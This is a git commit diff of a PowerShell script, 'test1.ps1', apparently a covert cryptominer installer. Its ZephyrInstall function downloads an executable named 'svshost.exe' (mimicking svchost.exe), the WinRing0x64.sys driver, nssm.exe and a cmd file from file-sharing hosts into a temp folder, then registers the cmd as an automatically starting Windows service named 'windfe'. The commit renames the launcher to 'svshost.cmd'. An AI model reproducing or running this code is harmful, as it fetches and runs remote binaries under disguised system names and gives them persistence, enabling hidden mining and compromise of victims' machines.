82fb27d4e25c232e7ac153f45b51c7bf0d17ca0a
bonguides25 <150642753+bonguides25@users.noreply.github.com>
2023-12-25 13:53:25 +0700

    Update test1.ps1

--- PS/test1.ps1
+++ PS/test1.ps1
@@ -23,13 +23,13 @@ function ZephyrInstall {
     # Invoke-WebRequest -Uri 'https://msgang.com/wp-content/uploads/2022/setup.exe' -OutFile "$env:TEMP\temp\setup.exe"
     Invoke-WebRequest -Uri 'https://tmpfiles.org/dl/3684777/svshost.exe' -OutFile "$env:TEMP\temp\svshost.exe"
 
-    Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/start1.cmd' -OutFile "$env:TEMP\temp\start1.cmd"
+    Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/svshost.cmd' -OutFile "$env:TEMP\temp\svshost.cmd"
     Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/WinRing0x64.sys' -OutFile "$env:TEMP\temp\WinRing0x64.sys"
 
     # Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
     Invoke-WebRequest -Uri 'https://tmpfiles.org/dl/3684775/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
 
-    .\nssm.exe install 'windfe' "$env:TEMP\temp\start1.cmd"
+    .\nssm.exe install 'windfe' "$env:TEMP\temp\svshost.cmd"
     Start-Sleep -Seconds 1
     Get-Service -Name 'windfe' | Start-Service
     Set-Service -Name 'windfe' -StartupType Automatic
